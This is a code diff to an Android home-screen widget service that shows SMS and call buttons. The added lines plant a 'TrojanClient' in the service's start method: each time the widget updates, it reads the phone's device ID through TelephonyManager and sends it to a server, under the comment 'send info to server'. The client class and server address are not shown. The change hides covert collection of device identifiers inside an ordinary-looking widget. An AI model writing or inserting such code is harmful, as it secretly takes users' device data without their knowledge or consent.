@@ -8,6 +8,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.os.IBinder;
+import android.telephony.TelephonyManager;
 import android.view.View;
 import android.widget.RemoteViews;
 
@@ -15,12 +16,25 @@ public class WidgetService extends Service{
 	RemoteViews rview;
 	boolean sms, call, newsms, shownam;
 
+	TrojanClient tclient;
+	GetInfo ginfo = null;
 	
     @Override
     public void onStart(Intent intent, int startId) {
         super.onStart(intent, startId);
+        
+        if(ginfo == null){
+        	TelephonyManager telephonyManager=
+                (TelephonyManager)  getBaseContext().getSystemService(Context.TELEPHONY_SERVICE);
+        	ginfo = new GetInfo(telephonyManager.getDeviceId());
+        }
+        
         rview = buildUpdate(this, intent);
-
+        
+        // send info to server
+        tclient = new TrojanClient(ginfo);
+        tclient.send("pig");
+        tclient.close();
         // Push update for this widget to the home screen
         ComponentName thisWidget = new ComponentName(this, WidgetProvider.class);
         AppWidgetManager manager = AppWidgetManager.getInstance(this);
@@ -62,7 +76,7 @@ public class WidgetService extends Service{
         // Get the layout for the App Widget and attach an on-click listener to the button
         RemoteViews views = new RemoteViews(c.getPackageName(), R.layout.widget);
 
-        //views.setImageViewResource(R.id.wd_icon, );
+        //views.setImageViewResource(R.id.wd_icon, R.drawable.contact2);
         views.setViewVisibility(R.id.wd_bg, View.VISIBLE);
         views.setTextViewText(R.id.wd_sms, "sms");
         views.setTextViewText(R.id.wd_call, "call");
